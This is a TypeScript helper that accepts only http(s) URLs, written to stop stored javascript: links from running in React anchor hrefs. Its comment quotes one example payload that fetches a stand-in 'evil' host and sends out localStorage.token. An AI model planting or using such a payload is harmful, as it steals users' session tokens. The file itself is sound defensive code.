/**
 * Return the URL only if it uses a safe http(s) scheme, otherwise undefined.
 *
 * Backend-supplied / scraped URLs (employee profile links, review URLs) are
 * rendered into anchor href. React does NOT sanitize href, so a stored value
 * like `javascript:fetch('https://evil/?t='+localStorage.token)` would execute
 * on click. Gate every such href through this helper.
 */
export function safeUrl(raw: string | null | undefined): string | undefined {
  if (!raw) return undefined;
  const trimmed = raw.trim();
  try {
    const parsed = new URL(trimmed);
    if (parsed.protocol === "http:" || parsed.protocol === "https:") {
      return trimmed;
    }
  } catch {
    // not an absolute URL — reject (no relative hrefs expected here)
  }
  return undefined;
}
